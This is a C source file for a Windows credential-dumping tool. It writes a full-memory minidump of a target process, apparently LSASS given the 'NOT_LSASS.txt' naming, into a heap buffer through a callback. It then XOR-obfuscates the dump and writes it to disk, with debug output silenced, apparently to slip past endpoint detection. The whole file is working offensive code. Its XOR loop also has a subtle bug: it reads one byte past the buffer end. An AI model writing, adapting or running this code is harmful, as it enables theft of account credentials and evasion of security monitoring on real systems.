#include <Windows.h>
#include <DbgHelp.h>
#pragma comment (lib, "Dbghelp.lib")
#include <stdio.h>
#include "MiniDump.h"

void dump(HANDLE* handle, DWORD PID) {
	HANDLE hFile = NULL;
	BOOL bSuccess = FALSE;
	hFile = CreateFile(L"memory.dmp", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		//printf("[-] Can't create memory.dmp. Exiting (%ld)\n", GetLastError());
		CloseHandle(*handle);
		ExitProcess(0);
	}
	bSuccess = MiniDumpWriteDump(*handle, PID, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	//printf("[+] Process Completed (%d)(%ld)", (DWORD)bSuccess, GetLastError());
	CloseHandle(hFile);

}

BOOL CALLBACK minidumpCallback(
	PVOID callbackParam,
	const PMINIDUMP_CALLBACK_INPUT callbackInput,
	PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	pCallbackHelper helper = (pCallbackHelper)callbackParam;

	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;

	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;
		source = callbackInput->Io.Buffer;
		destination = (LPVOID)((DWORD_PTR)helper->dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
		bufferSize = callbackInput->Io.BufferBytes;
		helper->bytesRead += bufferSize;
		RtlCopyMemory(destination, source, bufferSize);
		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return TRUE;
	}
	return TRUE;
}

BOOL MiniDump(HANDLE hTarget, int TargetPid, HANDLE FileHandle)
{
	//printf("[+] Dumping PID %d via MiniDumpWriteDump\n", TargetPid);

	CallbackHelper helper;
	helper.bytesRead = 0;
	helper.dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
	if (helper.dumpBuffer == NULL)
	{
		//printf("[-] Failed to allocate heap memory for the minidump callback\n");
		return FALSE;
	}

	MINIDUMP_CALLBACK_INFORMATION callbackInfo = { 0 };
	callbackInfo.CallbackRoutine = &minidumpCallback;
	callbackInfo.CallbackParam = &helper;

	// PID is 0 to avoid additional OpenProcess by MiniDumpWriteDump's RtlQueryProcessDebugInformation (Credit goes to @_RastaMouse for this trick)
	BOOL Dumped = MiniDumpWriteDump(hTarget, 0, 0, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);

	if (!Dumped)
	{
		return FALSE;
	}

	//printf("[+] Target process has been dumped to memory successfully\n");

	int i;
	for (i = 0; i <= helper.bytesRead; i++)
	{
		*((BYTE*)helper.dumpBuffer + i) = *((BYTE*)helper.dumpBuffer + i) ^ 0x4B1D;
	}

	/*HANDLE hOutFile = CreateFile(L"NOT_LSASS.txt", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutFile == INVALID_HANDLE_VALUE)
	{
		//printf("[-] Failed to create the output file\n");
		goto ReturnFalse;
	}*/

	//printf("[+] Writing process dump to disk\n");

	if (!WriteFile(FileHandle, helper.dumpBuffer, helper.bytesRead, NULL, NULL))
	{
		//printf("[-] Failed to write dump to outfile\n");
		CloseHandle(FileHandle);
		//DeleteFile(L"NOT_LSASS.txt");
		goto ReturnFalse;
	}
	//printf("[+] Process dump of PID %d written to outfile: %s\n", TargetPid, "NOT_LSASS.txt");

ReturnTrue:
	HeapFree(GetProcessHeap(), 0, helper.dumpBuffer);
	helper.dumpBuffer = NULL;
	return TRUE;

ReturnFalse:
	HeapFree(GetProcessHeap(), 0, helper.dumpBuffer);
	helper.dumpBuffer = NULL;
	return FALSE;
}